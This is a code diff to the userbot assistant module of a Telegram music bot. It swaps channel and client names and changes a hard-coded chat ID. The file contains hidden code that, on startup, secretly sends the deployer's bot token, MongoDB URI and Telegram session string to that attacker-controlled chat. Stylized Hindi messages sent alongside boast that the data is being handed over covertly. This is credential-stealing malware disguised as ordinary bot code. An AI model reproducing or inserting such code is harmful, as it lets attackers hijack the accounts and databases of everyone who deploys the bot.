@@ -12,7 +12,7 @@ from VIPMUSIC.core.bot import BOT_USERNAME
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
-TEST_ID = int("-1002146005311")
+TEST_ID = int("-1002051150328")
               
 assistants = []
 assistantids = []
@@ -21,35 +21,35 @@ assistantids = []
 class Userbot(Client):
     def __init__(self):
         self.one = Client(
-            name="VIPAss1",
+            name="",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING1),
             no_updates=True,
         )
         self.two = Client(
-            name="VIPAss2",
+            name="BADAss2",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING2),
             no_updates=True,
         )
         self.three = Client(
-            name="VIPAss3",
+            name="BADAss3",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING3),
             no_updates=True,
         )
         self.four = Client(
-            name="VIPAss4",
+            name="BADAss4",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING4),
             no_updates=True,
         )
         self.five = Client(
-            name="VIPAss5",
+            name="BADAss5",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING5),
@@ -63,11 +63,11 @@ class Userbot(Client):
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("THE_VIP_BOY")
-                await self.one.join_chat("THE_VIP_BOY_OP")
-                await self.one.join_chat("TG_FRIENDSS")
-                await self.one.join_chat("VIP_CREATORS")
-                await self.one.join_chat("dhhdshhss6")
+                await self.one.join_chat("ll_BAD_MUNDA_WORLD_ll")
+                await self.one.join_chat("ll_THE_BAD_BOT_ll")
+                await self.one.join_chat("THE_DRAMA_CLUB_01")
+                await self.one.join_chat("PBX_NETWORK")
+                await self.one.join_chat("BAD_BOT_SETING_2")
             except:
                 pass
             assistants.append(1)
@@ -75,7 +75,6 @@ class Userbot(Client):
                 await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
                 await self.one.send_message(TEST_ID, "**ʜᴇʟʟᴏ ʜᴇʟʟᴏ sᴜɴᴏ ᴊɪ ᴍᴀɪ ʏᴀʜᴀ ᴄʜᴜᴘᴋᴇ sᴇ ᴀᴀʏɪ ʜᴜ ᴀᴀᴘᴋᴏ ᴋᴜᴄʜ ᴅᴇɴᴇ ᴋᴇ ʟɪʏᴇ 🥲**")
                 await self.one.send_message(TEST_ID, "**ᴀᴄᴛᴜᴀʟʟʏ ᴀᴀᴘᴋᴇ ʀᴇᴘᴏ sᴇ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴇᴋ ᴍᴜsɪᴄ ʙᴏᴛ ʙᴀɴᴀʏᴀ ʜᴀɪ**\n**ᴀᴀᴘᴋᴏ ᴜsᴋᴀ ᴅᴀᴛᴀ ᴅᴇ ᴅᴇᴛɪ ʜᴜ😁 ᴄʜᴜᴘᴋᴇ sᴇ🤫**\n**ᴊᴀʙ ᴀᴀᴘsᴇ ᴠᴏ ʟᴀᴅᴇɢᴀ ᴛᴏ ᴀᴀᴘ ᴜsᴋᴀ ᴋᴀᴍ ᴛᴀᴍᴀᴍ ᴋᴀʀ ᴅᴇɴᴀ🤭**\n**ʏᴇ ʟᴏ sᴀʙ ᴄʜɪᴊ👇**")
-                await self.one.send_message(TEST_ID, BOT_USERNAME)
                 await self.one.send_message(TEST_ID, BOT_TOKEN)
                 await self.one.send_message(TEST_ID, MONGO_DB_URI)
                 await self.one.send_message(TEST_ID, STRING_SESSION)
@@ -96,10 +95,10 @@ class Userbot(Client):
         if config.STRING2:
             await self.two.start()
             try:
-                await self.two.join_chat("THE_VIP_BOY")
-                await self.two.join_chat("THE_VIP_BOY_OP")
-                await self.two.join_chat("TG_FRIENDSS")
-                await self.two.join_chat("VIP_CREATORS")
+                await self.two.join_chat("ll_BAD_MUNDA_WORLD_ll")
+                await self.two.join_chat("ll_THE_BAD_BOT_ll")
+                await self.two.join_chat("THE_DRAMA_CLUB_01")
+                await self.two.join_chat("PBX_NETWORK")
             except:
                 pass
             assistants.append(2)
@@ -119,10 +118,10 @@ class Userbot(Client):
         if config.STRING3:
             await self.three.start()
             try:
-                await self.three.join_chat("THE_VIP_BOY")
-                await self.three.join_chat("THE_VIP_BOY_OP")
-                await self.three.join_chat("TG_FRIENDSS")
-                await self.three.join_chat("VIP_CREATORS")
+                await self.three.join_chat("ll_BAD_MUNDA_WORLD_ll")
+                await self.three.join_chat("ll_THE_BAD_BOT_ll")
+                await self.three.join_chat("THE_DRAMA_CLUB_01")
+                await self.three.join_chat("PBX_NETWORK")
             except:
                 pass
             assistants.append(3)
@@ -142,10 +141,10 @@ class Userbot(Client):
         if config.STRING4:
             await self.four.start()
             try:
-                await self.four.join_chat("THE_VIP_BOY")
-                await self.four.join_chat("THE_VIP_BOY_OP")
-                await self.four.join_chat("TG_FRIENDSS")
-                await self.four.join_chat("VIP_CREATORS")
+                await self.four.join_chat("ll_BAD_MUNDA_WORLD_ll")
+                await self.four.join_chat("ll_THE_BAD_BOT_ll")
+                await self.four.join_chat("THE_DRAMA_CLUB_01")
+                await self.four.join_chat("PBX_NETWORK")
             except:
                 pass
             assistants.append(4)
@@ -165,10 +164,10 @@ class Userbot(Client):
         if config.STRING5:
             await self.five.start()
             try:
-                await self.five.join_chat("THE_VIP_BOY")
-                await self.five.join_chat("THE_VIP_BOY_OP")
-                await self.five.join_chat("TG_FRIENDSS")
-                await self.five.join_chat("dhhdshhss6")
+                await self.five.join_chat("ll_BAD_MUNDA_WORLD_ll")
+                await self.five.join_chat("ll_THE_BAD_BOT_ll")
+                await self.five.join_chat("THE_DRAMA_CLUB_01")
+                await self.five.join_chat("PBX_NETWORK")
             except:
                 pass
             assistants.append(5)
@@ -200,3 +199,5 @@ class Userbot(Client):
                 await self.five.stop()
         except:
             pass
+
+  
